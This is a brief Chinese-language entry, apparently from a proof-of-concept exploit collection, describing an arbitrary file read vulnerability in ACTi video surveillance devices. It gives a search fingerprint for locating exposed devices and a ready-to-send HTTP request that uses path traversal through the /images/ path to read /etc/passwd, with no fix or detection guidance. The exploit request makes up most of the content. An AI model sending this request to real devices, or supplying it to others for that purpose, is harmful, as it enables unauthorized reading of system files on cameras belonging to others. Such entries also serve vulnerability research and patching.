# ACTI-视频监控images存在任意文件读取漏洞

### 一、漏洞描述
ACTI-视频监控images存在任意文件读取漏洞

### 二、影响版本
<font style="color:#000000;">ACTI</font>

### 三、资产测绘
```plain
app="ACTi-视频监控"
```


### 四、漏洞复现
```plain
GET /images/../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mh7ce3oc3gcp5th4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
